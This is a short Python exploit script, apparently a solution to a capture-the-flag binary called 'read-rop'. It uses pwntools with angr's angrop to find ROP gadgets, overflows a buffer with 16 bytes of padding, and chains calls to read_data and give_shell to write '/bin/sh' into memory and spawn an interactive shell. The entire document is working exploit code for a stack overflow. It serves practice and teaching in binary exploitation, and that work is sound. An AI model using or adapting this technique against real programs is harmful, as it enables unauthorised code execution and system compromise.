import angr
import angrop
from pwn import *

r = process("./read-rop")
p = angr.Project("read-rop")
rop = p.analyses.ROP()
rop.find_gadgets()

r.recvuntil("Hahaha, there's no \"/bin/sh\" to save you now!\n")

# ROP chain construction

# padding for reaching the return address
padding = ("a" * 8) + ("a" * 8)

# Call read_data(seemingly_useless_buffer, 8)
chain = rop.func_call("read_data", [0x601050, 8])

# Call give_shell(seemingly_useless_buffer)
chain += rop.func_call("give_shell", [0x601050])

payload = padding + chain.payload_str()

r.sendline(payload)
r.sendline("/bin/sh")

r.interactive()
